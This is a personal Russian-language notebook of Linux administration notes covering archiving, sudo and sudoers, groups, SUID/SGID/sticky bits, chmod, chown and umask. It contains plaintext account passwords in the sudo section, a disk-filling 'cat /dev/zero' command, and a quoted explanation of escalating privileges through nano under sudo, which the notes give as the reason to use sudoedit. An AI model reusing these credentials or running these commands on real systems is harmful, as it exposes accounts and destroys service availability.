ls /etc/*  // лист каталогов и ф-лов в корне /etc + подкаталогов и ф-лов внутри их
tree //ДЕРЕВО калогов, команда утст-ся отдельно
ls -d ../sharemint/ // просмотр  информации только о Каталоге !
ls -ild ../sharemint/ // просмотр расширенной инф о Каталоге
187408 drwxr-sr-t 2 mint mint 60 янв 30 10:29 ../sharemint/
сhmod g-r-w /home/mint/  // забрать у каталога права чтения и записи у пользователей группы
ls -il `which sudo` // !!!  подстановка результата "which sudo"(/usr/bin/sudo) в ls
4906 -rwsr-xr-x 1 root root 232416 жні  4 13:35 /usr/bin/sudo
ls -il `which passwd`
4559 -rwsr-xr-x 1 root root 59976 ліс 24 15:05 /usr/bin/passwd



    = = АРХИВАЦИЯ = =   
https://losst.pro/arhivatsiya-v-linux?cmdurl=1
архивирование в linux это не одно и то же что и сжатие файлов linux.
Архивирование - объединение нескольких  файлов в один, с целю более удобной последующей 
передачи, хранения, шифрования или сжатия. 
 = = tar и zip/unzip = = создают и распаковывают архивы с использованием сжатия файлов или без
$ tar опцииf файл_для_записи /папка_файлами_для_архива
A - добавить файл к архиву
c - создать архив в linux
d - сравнить файлы архива и распакованные файлы в файловой системе
j - сжать архив с помощью Bzip
z - сжать архив с помощью Gzip
r - добавить файлы в конец архива
t - показать содержимое архива
u - обновить архив относительно файловой системы
x - извлечь файлы из архива
v - показать подробную информацию о процессе работы
f - файл для записи архива
-C - распаковать в указанную папку
--strip-components - отбросить n вложенных папок
tar cvf arx.tar f1.txt f2.txt // добавить в файл архива f1 и f2 БЕЗ сжатия
tar cJvf arx_xz.tar f1.txt f2.txt //добавить в архив f1 и f2 СЖАТЫМИ(J)алгрт xz(лучше gzip)
tar czvf arx_gzip.tar f1.txt f2.txt//добавить в архив f1 и f2 СЖАТЫМИ(z)алгрт gzip
tar czvf archive.tar ~/ //запаковать со сжатием gzip все файлы их папки /home/usrname
tar tvf /tmp/arx_xz.tar //вывести данные о файлах в архиве на станарный вывод
tar xvf archive.tar // распаковать архив tar  в ТЕКУЩИЙ КАТАЛОГ/PWD
tar xvf arx.tar -C /tmp/  // распаковать архив tar в КАТАЛОГ /tmp
tar xvf mc.tar.xz  // tar также распаковывает XZ compressed data
tar xvf iperf.tar.gz //tar также распаковывает  gzip compressed data
tar rvf arx2.tar f123.txt nam.sh //добавить в НЕСЖАТЫЙ арихив файлы, в т.ч. другие архивы
 // в архивы со сжатием добавить отдельные файлы невозможно

// ! распаковка ВСЕГДА будет в ТЕКУЩИЙ КАТАЛОГ/PWD!
zip -rv9 /tmp/arx.zip ~/ //сжать и заархивировать все файлы из /home/usrname форматом zip c лучшим сжатием
zip -Tv /tmp/arx1.zip // протестировать файл архива на целостность
unzip archive.zip //распокавать ВЕСЬ архив zip в ТЕКУЩИЙ КАТАЛОГ/PWD
unzip archive.zip f1.txt //распокавать один файл f1.txt из архива в ТЕКУЩИЙ КАТАЛОГ/PWD

    = = gzip - НЕ может создавать архивы сжатых файлов (множество файлов в одном),
  только ОДНОГО файла
gzip -v f* // сжать файлы f* алгртм gzip в файлы f*.gz и УДАЛИТЬ исходные файлы
-> ls -ilh f*
   553069 -rw-rw-r-- 1 oem oem 4,7K июл 10 12:21 f1.txt.gz
   552617 -rw-rw-r-- 1 oem oem  37K июл 10 12:21 f2.txt.gz
gzip -cv файл_для_сжатия > archive.gz //сжать файл алгртм gzip и НЕ УДАЛЯТЬ исходный файл
gzip -tv archive.gz //РАсжать файл и УДАЛИТЬ архивный файл
gzip -dv а.gz //РАсжать файл и УДАЛИТЬ архивный файл
gzip -dv f*.gz // //РАсжать файлs f*.gz и УДАЛИТЬ архивы  f*.gz
gunzip -cv archive.gz > расжатый_файл // распаковать файл, также сделать копию "расжатый_файл" и НЕ удалЯть архивный файл
gunzip -v archive.gz // распаковать файл и удалИть архивный файл

 = = cpio ==  CopyInAndOut.Cтандартный архиватор для Linux для пакетов Red Hat,а также
для создания initramfs. Архивация в Linux для обычных файлов с помощью этой программы 
не применяется.
ls //например выдает содержание каталога// file1.txt file2.txt file3.txt
ls | cpio -ov > /pathto/output_folder/arxiv.cpio // запаковать 3 файла через конвеер 
cpio -i < archive.cpio // распаковать в текущую папку

mkdir new && cd new // выполнить подряд команды
mkdir new ; cd new; >filenew.txt; nano filenew.txt // выполнить подряд команды


file * // вывод информации для всех файлах каталога

file f*
ffind:        Bourne-Again shell script, ASCII text executable
ffps:         Unicode text, UTF-8 text, with very long lines (340)
fi1:          ASCII text

file -L * // вывод информации С ПЕРЕНОСОМ СЛОВ для всех файлов каталога 
file /usr/bin/passwd; echo ----; file /etc/passwd  // ВЫПОЛНЕНИЕ 2 КОМАНД FILE ПОДРЯД С РАЗДEЛЕНИЕМ "----"
/usr/bin/passwd: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3491ccd9d01e39519fb586aa5be367b22d4cf6ef, for GNU/Linux 3.2.0, stripped
----
/etc/passwd: ASCII text
file /usr/bin/passwd  /etc/passwd // ВЫПОЛНЕНИЕ КОМАНДЫ FILE ДЛЯ 2Х ФАЙЛОВ ПОДРЯД 
/usr/bin/passwd: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3491ccd9d01e39519fb586aa5be367b22d4cf6ef, for GNU/Linux 3.2.0, stripped
/etc/passwd:     ASCII text


bash /ssh - командый интерпретатор
dir // ч.б вариант ls
ctrl-Z - приостоновка выполняющегося процесса, перевод его в фоновое выполнение
ctrl-С - Завершение/штатное/корректное  выполняющегося процесса 
ctrl-D - завершение ввода в процесс (ввести символ конец файла)
ctrl-\ аварийное прерывание процесса

cat /dev/zero > fzero // СОЗДАТЬ ФАЙЛ,путем чтения из /dev/zero и записи в файл (заполнить всеcь диск!)                      //    /dev/zero - символьное устройство, генерирующее бесконечное число символов 

od -c 1.txt //вывести содержимое файла в двном восмирчн 16ричном или -с символьном формате с показом спецсимволов 
0000000   D   e   s   k   t   o   p  \n   t   s   t   1   .   t   a   r
0000020   g   e   t  \n   t   s   t   2   .   t   a   r   g   e   t  \n
0000040   u   s   b   m   n   t  \n   W   a   r   p   i   n   a   t   o
0000060   r  \n 320 222 320 270 320 264 320 265 320 276  \n 320 224 320

Передача сообщений между терминалами  write
mvn2@mint:/$ write mint pts/2 // писать на терминал pts/2 пользователю mint, пока не ctrl-D
  (принимает и передает на терминале через ssh (pts) ИЛИ ctrl-alt-f2 tty2 и др,
   не принимает из pts/0 по SSH на граф терминале mint).
oem@LnxPC:~$ 
Message from mvn@LnxPC on tty2 at 16:15 ...
hihihi!
На приеме быть "mesg y". Если pts/1 также mint, он не получит сообщенией
echo hi! | write oem pts/0 // отправить короткое сообщение, без не ctrl-D 


man 8 mount // см справку mount (8) / из раздела 8



= = =  = sudo = = = =
{oem wsx555  login password пароли
mvn edc555 profi zxc555}

см 17. su — Основы GNU_Linux и подготовка к RHCSA
   18. sudo — Основы GNU_Linux и подготовка к RHCSA
 Кетов: в linux root не учетная запись суперпользовтеля "админ", 
     а роль пользовтеля, кому разрешено быть sudoers! 

НАДЕЛЕНИЕ ПРАВАМИ администратора SUDO root 
su -l mvn // войти в сеанс bash как пользватель mvn
su mvn -c "touch 123"// выполнить однократно команду от лица пользователя mvn
   //sudo не требует ввода пароля суперпользователя
sudo su // войти как root
 [sudo] пароль для oem:
 root@LnxPC:/home/oem#

sudo -i // войти в интерактивный/постоянный режим root
sudo -s //войти в интерактивный/постоянный режим root 
sudo -u mvn nano /home/mvn/file1.txt // войти в сеанс под правами пользователя mvn и отредактировать файл
sudo -l // прочитать возможности /привелегии  для текущего пользователя

файл /etc/sudoers изменять только ЧЕРЕЗ "sudo visudo"
Будучи пользователем с правами группы admin или иными привелегиями в /etc/sudoers,  
  пользователь сможет запускать лишь программы, опреденные переменной secure_path /etc/sudoers
cat /etc/sudoers
Matching Defaults entries for oem on LnxPC:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, pwfeedback
User oem may run the following commands on LnxPC:
    (ALL : ALL) ALL  // это значит , что oem включен в группу admin  см ниже синтаксис sudoers!!
    (root) NOPASSWD: /usr/bin/mintdrivers-remove-live-media // можно запускать без пароля
    (root) NOPASSWD: /usr/bin/mint-refresh-cache

sudoedit - устрание уязвимости при редактир-и файлов через vi и nano,
     которые могут вызывть др.программы!! Для этого следует прописать в /etc/sudoers в строке:
  mvn LnxPC=(root) слова "/usr/bin/sudoedit /etc/passwd," взамен "/usr/bin/nano /etc/passwd,"
 см "18. sudo — Основы GNU..."
"В некоторых случаях  используют sudo, чтобы предоставить доступ к редактированию системынх
 файлов. В sudo есть относительно безопасный способ редактирования файлов с помощью sudoedit.
 Для примера, давайте предоставлю пользователю user2 право редактировать файл /etc/passwd с 
 помощью nano. Он вроде бы и не может открыть командой другой файл, но возможно изнутри nano
 открыть другой файл с помощью ^R, допустим, тот же sudoers, изменить его и сохранить как 
 /etc/sudoers, тем самым обеспечив себе все права. 
 Если же в sudoers я пропишу sudoedit, то предыдущая схема не будет работать, 
 потому что принцип работы немного другой. sudoedit копирует нужный мне файл во временный файл,
 я редактирую временный файл, а когда сохраняю – то sudoedit заменяет нужный файл той копией, 
 которую изменил."  

 ## Логирование действий sudo и su - в файле  tail /var/log/auth.log ## 
Nov  7 15:56:01 LnxPC sudo:      mvn : command not allowed ; TTY=pts/0 ; PWD=/home/mvn ; USER=root ; COMMAND=sudoedit /etc/sudoers
Nov  7 15:56:11 LnxPC sudo:      mvn : TTY=pts/0 ; PWD=/home/mvn ; USER=root ; COMMAND=/usr/bin/editor -- /etc/passwd
Nov  7 15:56:11 LnxPC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by oem(uid=0)
Nov  7 15:56:41 LnxPC sudo: pam_unix(sudo:session): session closed for user root
Nov  7 15:56:47 LnxPC su: pam_unix(su-l:session): session closed for user mvn
Nov  7 15:57:04 LnxPC sudo:      oem : TTY=pts/0 ; PWD=/home/oem ; USER=root ; COMMAND=/usr/bin/less /etc/sudoers
Nov  7 15:57:04 LnxPC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by oem(uid=29999)
Nov  7 15:58:49 LnxPC sudo: pam_unix(sudo:session): session closed for user root

!! Отдельно !!
чтобы была возможность oem в папке /home/mvn читать содержимое файла file в "без sudo"
установить права на file 'chmod o+r file' и на каталог 'chmod o+rw /home/mvn/'!!! 


Кетов Администрирование видео 1.3 !:
root в RedHat (CentOS,..) root это настоящая учетная запись с которой можно зайти в систему. 
В Debian(Ubuntu) root это роль, от лица которой др пользователи могут выполнять программы, 
получать доступ к ресурсам OC, но от него нельзя зайти в систему (и это ПРАВИЛЬНО, ибо снижает риски уязвимости ОС - Кетов)
Передача полномочий от лица root др пользователям выполняется по схеме: 
1)Вариант1 Программой /usr/bin/visudo (ОБЯЗАТЕЛЬНО, СОХРАНЯЕТ РЕЗЕРВ) ->
2) Редактируем файлы конфигураций /etc/sudoers и/или файлы в каталоге /etc/sudoers.d ->
 3) применяем  программы /usr/bin/sudo; 
/usr/bin/sudoedit  для запуска программ от лица полномочий root
Например, mint является сразу членом группы "sudo" и имеет право запуcка sudo
mint@mint:~$ id
uid=999(mint) gid=999(mint) groups=999(mint),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),137(sambashare)
mvn@mint:~$ id // mvn не член группы sudo, не имеет параво на sudo
uid=1000(mvn) gid=999(mint) groups=999(mint)


  = = Добавление/Удаление СУЩЕСТВУЮЩЕГО пользователя в группу sudo adm = =
Кетов Администрирование 2.1 (1.3 или ранее)!:
cat /etc/sudoers // !!! база данных пользователей, кому разрешены права sudo root
  # User privilege specification
  root    ALL=(ALL:ALL) ALL
  # Members of the admin group may gain root privileges
  %admin ALL=(ALL) ALL
  # Allow members of group sudo to execute any command
  %sudo   ALL=(ALL:ALL) ALL
mvn@mint:~$ sudo hwclock mint
   Sorry, user mvn is not allowed to execute '/usr/bin/hwclock' as root on LnxPC.
1)  Вариант1
Если добавить  в /etc/sudoers через visudo 
"mvn  LnxPC=(root) /usr/sbin/iptables, /usr/sbin/hwclock"
mvn получает права на выполнение iptables и hwclock

user_name     ALL=   (root)            ALL
%gr_name
^кому         ^нахосте  ^отчьеголица   ^какие программы   
(польз/группе)
 // синтаксис /etc/sudoers  следующий: пользователю (user_name) на ALL (всех узлах, включая текущий LnxPC) от лица пользователя (root)
   предоставить право выполнять ВСЕ (ALL)программы (где есть биты передачи полномочий s)  

2) Вариант2 : вместо записи "mvn ALL=(root) ALL" в /etc/sudoers  можно выполнить команду
sudo usermod -aG sudo mvn  //добавления пользователя в группу sudo в файл /etc/shadow(эфффект будет тот же). 
Чтобы без перезагрузки ОС понимала, то пользователя mvn добавили в  группу sudo
    надо выполнить su -l $USER
https://losst.pro/kak-dobavit-polzovatelya-v-gruppu-linux?ysclid=lpeivvka9m37226109 // добавить ПОЛЬЗОВАТЕЛЯ C SUDO !!
$ usermod опции
-G - дополнительные группы для пользователя;
-a - добавить пользователя в дополнительные группы из параметра -G, а не заменять им текущее значение;
-g - установить новую основную группу для пользователя, такая группа уже должна существовать, и все файлы в домашнем каталоге теперь будут принадлежать именно этой группе.

Для каждого пользователя существует два типа групп, это первичная, основная для негои дополнительные.
Первичная группа - создается автоматически, когда пользователь регистрируется в системе, 
  в большинстве случаев имеет такое же имя, как и имя пользователя.
  Пользователь может иметь только одну основную группу!!!
Вторичные группы - это дополнительные группы, к которым пользователь может быть добавлен 
  в процессе работы, максимальное количество таких групп для пользователя - 32;

                 !!удалить ПОЛЬЗОВАТЕЛЯ из Основной и дополнительной группы!!!
sudo usermod -G "" mvn // !!удалить !!! mvn из всех ДОПОЛНИТЕЛЬНЫХ групп, в тч sudo
gpasswd -d пользователь группа //удалить ПОЛЬЗОВАТЕЛЯ из !ОСНОВНОЙ ГРУППЫ!
https://losst.pro/udalit-polzovatelya-iz-gruppy-linux

3) Вариант3  sudo gpasswd -a mvn sudo
sudo usermod -L/-U mvn // заблокировать/разблокировать учетную запись mvn - по факту добавить "!" для 				// уч.записи mvn в файле /etc/shadow (mvn:!$y$....URBooI1:19402:0:99999:7:::),                //что делает  ч.запись непригодной для входа в систему, т.е из mvn - псевдопользователя
  = END Добавление/Удаление пользователя  =


= Запуск программ GUI X11 из tty cli терминала + cocpit  =
firefox --help
Usage: /usr/lib/firefox/firefox [ options ... ] [URL]
       where options include:
X11 options  --display=DISPLAY  X display to use

в gui-bash: 
echo $DISPLAY 
:0.0
в cli-bash: 
firefox --display=":0.0"  #запуск firefox в X11 сервер, но выдает ошибки в cli-bash
thunderbird  --display=":0.0" --sync
ssh -X root@192.168.100.4 #запуск ssh-сеcсии с пробросом графики X11 между VM LnxPСs 
= END Запуск программ GUI из tty cli терминала  =


https://ubunlog.com/ru/cockpit-interfaz-web-para-servidores-ubuntu-20-04/#Instalar_Cockpit_en_Ubuntu_2004
https://habr.com/ru/articles/471220/
https://10.250.14.230:9090/
sudo netstat -tulnp
Активные соединения с интернетом (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State       PID/Program name
tcp6       0      0 :::9090                 :::*                    LISTEN      1/init
ss 
tcp    ESTAB   0       0        -  работает по ipv6!??????????
[::ffff:10.250.14.230]:9090          [::ffff:10.250.15.3]:57295   uid:130 ino:305724 sk:203 cgroup:/system.slice/cockpit.socket <->
= END Запуск программ GUI из tty cli  + cocpit =



Псевдопользователи: сетевые службы (демоны) sshd ntp syslog ... которые в файле в файле/etc/shadow вторым полем имеют * (т.е. не могут входить в сиcтему)
sshd:*:19401:0:99999:7:::

X11 - программы связанные с графическим интерфейсом GUI windows system,
Кетов Администрирование 3.1.1:
getty - программа  ОБРАБОТЧИК ТЕРМИНАЛА!, в т.ч. ввода приглашения в командном интерпретаторе 
login  - программа ввода login passwod в командном интерпретаторе  
login в CLI выполняет функции AAA А(проверки имени_п)А(проверки полномочий имени_п)A(записи в журнал) - через модуль  PAM (Plugable autent Module)  
PAM:
Аутентификация - проверка подлинности  пароля по  Хеш сумме из файла shadow
Авторизация проверка прав пользователя в данной конфигурации (уровня загрузки runlevel init) персонального
   компьютера. Если был  запущена программа shutdown c отложенным выполнением, она сделат запись в
   /etc/nologin и програма login (или xlogin) не даст пройти авторизаци и предоставить доступ к
   командному интерпретатору пользователя shell или в X-session в GUI учет пользователй, прошедших
   авторизацию в файлах /var/log/wtmp   /var/run/wtmp /var/run/lastlog

Кетов Администрирование 3.2.1:
3 вида доступа пользователей в linux  CLI, GUI, ssh
X-сервер ПО GUI в linux (xdm kdm gdm dm - display manager) также является сетевой службой X(6000 порт), предоставляющей сервис типа тонкого клиента удаленным пользователям linux. X-сервер не является частью ядра в отлии от getty и /dev/tty1-6 для CLI. Xdm- аналог getty в CLI
xlogin - программа GIU ввода пароля, аналог login в CLI, выполняет функции ААА - PAM
X-session запускается программой xlogin, - сеанс работы X-клиентов, в mint - "xfce4-session" 

 = = =  = = = = = = = = = = = = = =  Терминалы Linux: = = = = = = = = = = = = = = = = = =
!Вызов/переключения tty терминалов ctrl+alt+f1-f5
В CLI: терминалы буквенныо-цирфовые  ttу1-ttу6
в GUI: X-session терминал tty7, 8 ... 
Через ssh: - терминалы - "pty"


 = = = = = = = = = = = =  Внутренние ДОКУМЕНТАЦИИ LINUX  = = = = = = = = = = = = = = = = = 
Храниться в /usr/share/man  /usr/share/info/  /usr/share/doc/
info bash //просмотр инструкции
man bash //просмотр мануала
help команда // краткое описание внутр командой bash - help 
help -d команда
help -d umask
umask - Display or set file mode mask.
help -d help
help - Display information about builtin commands.

man troff less Кетов книга стр 35 
программа  man работает: находит архив gz справки, распаковывает архив, 
преобразует через процессор разметки troof, оправляет в less
Я: Приблизительно так, но не все ключи  troff подобрал точно
gunzip -cv  /usr/share/man/man1/nping.1.gz | troff -aC | less

man -t man > man.pnt.1 // конвертировать man страницу в postscrip файл
man -Thtmp man > man.html // конвертировать man страницу в файл html


 = = = = = = = = = = = = ПРИСВОЕНИЕ ПРАВ НА ФАЙЛА И ДИРЕКТОРИИ = = = = = = = = = = = = = = = = = =
Кетов: Базовые (кроме ACL) биты прав на ДОСТУП к файлам: SUID,SGID,T(sticky bit), U:rwx, G:rwx, O:rwx
SUID, SGID - биты передачи полномочий на eXecute на Исполнение от лица владельца
T(sticky bit) - бит передачи полномочий на write запись в директории (см /tmp)
ls -ld /tmp/
drwxrwxrwt 19 root root 4096 апр 26 15:49 /tmp/
find / -type d -perm /+t 2>/dev/null 1> /tmp/dirt.txt & // найти все каталоги с битом t

Понимание расширенных прав SUID, SGID и sticky bit   https://habr.com/ru/post/469667/  
  -! в статье опечатка, вместо GUID д.б. SGID 2 раза
SUID, SGID - биты передачи полномочий Выполнять/Запускать файлы/команды другим Пользователям (SUID, setuid)
 и Группам пользователей (SGID, setgid) от имени их владельца (например root)

Есть три продвинутых разрешения. 
1)Первое SUID (set-user-ID) разрешение на установку идентификатора пользователя (SUID). 
 Можно применить это разрешение к ИСПОЛНЯЕМЫМ (системным) файлам. 
 По умолчанию пользователь, запускающий исполняемый файл, запускает этот файл со своими
 собственными разрешениями. Некоторые файлы нужно дать запускть др. пользователям с правами/
   от имени влдаельца, например
ls -il /usr/bin/passwd  /usr/bin/sudo  /usr/bin/newgrp
   135483     60 -rwsr-xr-x   1 root     root        59976 ноя 24 15:05 /usr/bin/passwd
   135828    228 -rwsr-xr-x   1 root     root       232416 авг  4  2022 /usr/bin/sudo
   135399     40 -rwsr-xr-x   1 root     root        40496 ноя 24 15:05 /usr/bin/newgrp
!!! Здесь стоит setuid – позволяет запускать программы passwd sudo.. не от имени нашего пользователя,
  а от имени root!!!
Можете видеть разрешение SUID с ls -l как s в позиции, где обычно вы ожидаете увидеть x для 
 пользовательских разрешений
2) Второе специальное разрешение — это идентификатор группы (SGID) (set-group-ID)
 Разрешение SGID показывается в выводе ls -ld как "s" в позиции, где вы обычно находите 
 разрешение "x" на выполнение Группы:
ls -ld account 
drwxr-sr-x. 2 root account 4096 Apr 30 21:28 account 
 SGID - разрешение имеет два эффекта. При применении к ИСПОЛЯНЕМОМУ файлу, он дает
 пользователю, который исполняет файл, разрешения владельца группы этого файла. 
 Когда применяется к КАТАЛОГУ SGID может быть полезен, потому что вы можете использовать 
 его для установки владельца группы поУМОЛЧАНИЮ  для файлов и подкаталогов, созданных в этом
 каталоге. Т.е. если sudo chmod g+s .dir/; chown :student .dir/; то пользователь  "oem" из 
  группы "oems" выполнив,  touch .dir/file5; ls -il .dir/file5 получит файл в группе students
      921747 -rw-rw-r-- 1 oem students  0 ноя 24 15:05 .dir/file5
 
 Как и в случае с разрешением SUID, разрешение SGID применяется к некоторым системным файлам
 в качестве  настройки по умолчанию.
3) Ketov "sticky bit" = только для защиты КАТАЛОГА от удаления файлов другими пользователями 
  группы и всеми остальными!
 Третий из специальных разрешений — sticky bit.  Это разрешение полезно для защиты файлов от
 случайного удаления в среде, где несколько пользователей имеют права на запись в один и тот же каталог.  Без sticky bit, если пользователь может создавать файлы в каталоге, он также может удалять файлы из этого каталога.
 Когда вы применяете sticky bit, пользователь может удалять файлы, ТОЛЬКО если выполняется 
 ОДНО из следующих условий: A) Пользователь является владельцем файла; 
 B) Пользователь является владельцем каталога, в котором находится файл.
 При использовании ls -ld, вы можете видеть sticky bit как "t" в позиции, где вы обычно 
 видите разрешение на выполнение для групп other: ls -ld /home/sharemint/
drwxrwsr-t 2 mint mint 60 янв 30 14:56 /home/sharemint/

SetUID, SetGID и sticky bit в числовом формате задаются для  umask chmod 
как !СПЕЦИАЛЬНЫЕ РАЗРЕШЕНИЯ! - первая цифра  перед правами на файл пользовалателя "u", группы "g"
и всех остальных "o"  программ chmod/umask/chown х755 
х = {  "1"  sticky bit | "4"  SetUID | "2" SetGID }
sudo chmod 1775 -R ./dir/ ; ls -ilR ./dir/
= sudo chmod +t -R ./dir/*; ls -ilR ./dir
920510 drwxrwxr-t 2 mvn oem 4096 окт 29 18:50 dir2 //+sticky bit
920211 -rwxrwxr-t 1 mvn oem    0 окт 29 18:49 f1

sudo chmod 2775 -R ./dir/; ls -ilR ./dir/ 
= sudo chmod g+s -R ./dir/*; ls -ilR ./dir
920510 drwsrwsr-x 2 mvn oem 4096 окт 29 18:50 dir2 //+SetGID
920211 -rwxrwsr-x 1 mvn oem    0 окт 29 18:49 f1

sudo chmod 4775 -R ./dir/ ; ls -ilR ./dir
= sudo chmod u+s -R ./dir/*; ls -ilR ./dir
920510 drwsrwxr-x 2 mvn oem 4096 окт 29 18:50 dir2  //+SetUID
920211 -rwsrwxr-x 1 mvn oem    0 окт 29 18:49 f1

Чтобы применить SUID, SGID и sticky bit, вы также можете использовать chmod, укзав в 
 ПЕРВОЙ СЛЕВА ЦИФРЕ
SetUID имеет числовое значение "4", SetGID имеет числовое значение "2", а  
  sticky bit имеет числовое значение "1".
Если вы хотите применить эти разрешения, вам нужно добавить ЧЕТЫРЕХзначный аргумент в chmod,
 ПЕРВАЯ ЦИФРА которого относится к специальным разрешениям. 
 Следующая строка, например, добавит разрешение SGID на Каталог и установит rwx для пользователя и rx для группы и других:
chmod 4755 /dir #4-разрешение SUID, на Каталог и rws для пользователя и rx для группы и других
 chmod u=swr,g=rx,o=rx _dir1
  drwsr-xr-x
chmod 2755 /dir #2-разрешение SGID на Каталог и rwx для пользователя и r-s для группы и других
 chmod u=rwx,g=rxs,o=rx
  drwxr-sr-x 
chmod 1755 /dir #1-sticky bit на Каталог и rws для пользователя и rx для группы и других
 chmod +t
  drwxr-xr-t

Альтернативный подход:  Для SUID используйте chmod u+s (или u-s для удаления).
Для SGID используйте chmod g+s (или u-s для удаления).
Для sticky bit используйте chmod +t (-t для удл),
              а затем имя файла или каталога, для которого вы хотите установить разрешения.
chmod 00775 name - снять все атрибуты SUID, SGID, sticky bit  c директории или с файлы

chmod 777 file // изменить атриб фала
Режимы доступа к файлу в двоичном и восьмеричном представлениях
Двоичное Режим доступа
0 000 ---
1 001 --x
2 010 -w-
3 011 -wx
4 100 r--
5 101 r-x
6 110 rw-
7 111 rwx
chmod ugo+rwx f1 // назначить для файла f1 всем типам пользователей user group other все права r w x
или
chmod u=rwx,g=wrx,o=wrx f1 //назначить для файла f1 всем типам пользователей user group other все права r w x
chmod o-rwx f1 // ислючить для файла f1  пользователям other все права r w x


sudo chown mvn:students -R ./dir/ - изменить для всех файлов внутри dir владельца и группу владельца
sudo chown mvn: -R ./dir/ - изменить для всех файлов внутри dir толко владельца на mvn
sudo chown mvn:students ./dir/* - изменить для всех файлов внутри dir владельца и группу владельца
sudo chown mvn: ./dir/* - изменить для всех файлов внутри dir толко владельца на mvn
sudo chown :students ./dir/* - изменить для всех файлов внутри dir только группу владельца на students

sudo chown mint:users /dir/; chmod 777 /dir/; umask 000 //установить (польз-м гр users) полный 
  доступ для всех пользователей в каталог (другие пользователи группы и совсем другие
  смогут создавать свои файлы и редактировать файлы mint)	 
chmod +t  /dir/ // установить запрет на удаление в каталоге файлов ДЛЯ других пользователей и группы и совсем других. Пользователь mint, создавший каталог, 
СМОЖЕТ удалять и свои файлы и файлы, созданные другими пользователями
user2$ rm file1
rm: cannot remove 'file1': Operation not permitted

ПРАВА rwx для КАТАЛОГОВ: каталог содержит список имен файлов, поэтому
1) ПРАВО ЧТения "r" для КАТАЛОГОВ: — это право просмотра списка имен его файлов 
  (возможность выполнять ls dir_name, file dir_name). 
2)ПРАВО ЗАПИСИ "w" для каталога — это Право ДОПОЛНЯТЬ записи в список и право УДАЛЕНИЯ из этого 
  списка каталога dir_name т.е. право выполнять сист запрос STAT, право УДАЛЕНИЯ файлов из
  каталога (rm) и СОЗДАНИЯ файлов в каталоге (touch, cp, mv). 
Аналогично, 
3) ПРАВО ИСПОЛНЯТЬ "х" для каталога является правом прохода (ВОЙДИ) в каталог, т. е. позволяет
  обращаться к файлам внутри каталога по их ИМЕНИ (stat name, file name, nano name ...) и 
  УДАЛЯТЬ/ПЕРЕМЕЩАТЬ их (если пользователю заранее известны имена файлов без ls известны их
  имена и есть право на ЗАПИСЬ w!!)

ПРАВА на CHAR устройства/файлы
для файлов-символических устройств (c - потоков /dev/tty сокеты) это право "r" - читать из потока std1, "w" писать в поток  std0 //ПРОВЕРИТЬ, в т.ч комaнду write
https://www.youtube.com/watch?v=zaeg0EtiPtw&t=14s

sudo chown root:root file // изменить владельцa и группу владельца файла
sudo chown -R user:groupuser /dir/ // изменить владельцa и группу владельца каталога и ВСЕх его файлов и вложенных каталогов РЕКУРСИВНО
                              // использовать для создания домашненей папки нового пользователя (созданного без нее), например всей папки /mint/ через sudo и  изменения прав на файлы в ней

 = = = = = = umask = = = = = =
https://losst.pro/komanda-umask-v-linux !!
umask  !!! служит для того чтобы УСТАНАВЛИВАТЬ "ПО-УМолчанию" права доступа к собственным файлам для пользователй своей и др групп. РЕЗУЛЬТАТ команды работает для создаваемых ПОСЛЕ выполнения команды файлов.! Для изменения прав на ранее созданные - есть chmod.
команда задаёт набор прав, которые будут применены к файлам и директориям при ИХ СОЗДАНИИ.
Использование аргумента команды umask схоже с абсолютным режимом chmod, но значение битов инвертировано.
Нужно определить тип доступа, который вы хотите установить для владельца, группы и остальных, и вычесть каждую цифру из 7. В результате получится маска из трех цифр. Например, вы хотите себе предоставить все права (7), своей группе – право чтения и выполнения (5), а остальным – никаких прав (0). Вычтите каждую цифру из 7 и получите 0 – для себя, 2 – для своей группы и 7 – для остальных. Поэтомув стартовый файл нужно поместить команду: umask 027
ВАЖНО ! umask внутренняя Команда  bash - работает в пределах !ОДНОЙ СЕССИИ! терминала и не распространяется
на всю систему и другие сессии." В основном umask используется для написания скриптов
ВАЖНО, umask не устанавливает для execute! umask не может предоставить права на выполнение файла!!Даже если указать маску 000, разрешающую всё, то для файла будут заданы права rw-rw-rw-.
Команда (внутренняя bash) umask задаёт маску прав для НОВЫХ файлов и каталогов. 
При создании любого файла операционная система запрашивает маску прав и рассчитывает маску на основе неё.
По умолчанию стоит маска 0002,!Первая цифра ни на что не влияет и является пережитком синтаксиса языка C.
Дальше цифры : первая - владелец, вторая - группа и третья - все остальные. 
Эта маска 0002 используется для расчета прав файла.Pассчитывается всё довольно просто, от максимальных прав
отнимается маска и получаются права для файла. Фактически, получается, что маска содержит права, которые не
будут установлены для файла. Поэтому права по умолчанию для файла будут 666 - 002 = 664, а для каталога - 777 - 002 = 775.
UMASK храниться в /etc/sysstat/sysstat
Просмотр маски:
umask -S // просмотр текущих настроек umask в расшир СИМВОЛЬНОМ формате
u=rwx,g=rwx,o=rx
umask // просмотр текущих настроект umask в кратком ЦИФРОВОМ 8-ричном формате
0002

umask -S
u=rwx,g=rwx,o=rwx
umask 
0000
Задание маски:
Маску можно задать и с помощью более традиционных обозначений:
umask u=rwx,g=rwx,o=
В отличие от битовой маски, таким способом прописываются разрешения, а не запреты.
Иными словами, права задаются ровно так же, как и в chmod. !Но право на выполнение не выдаётся!
umask a=rwx // umask a=rwx
umask ug-w // отнять права на чтение

Сравнение umask и chmod (три значительных отличия:
Первое, umask задаёт маску для НОВЫХ файлов, 
а chmod устанавливает права для существующих.
Второе, если говорить о маске, то у umask она инверсная. 
Если какой-либо бит в ней равен 1, то это означает запрет на выполнение соответствующей операции.
!!!Третье, umask не может предоставить права на выполнение файла!!!!
Даже если указать маску 000, разрешающую всё, то для файла будут заданы права rw-rw-rw-.

Типы прав доступа:
Для ФАЙЛОВ  r (read) – чтение файла. w (write) – изменение файла. x (execute) – выполнение файла, как программы.
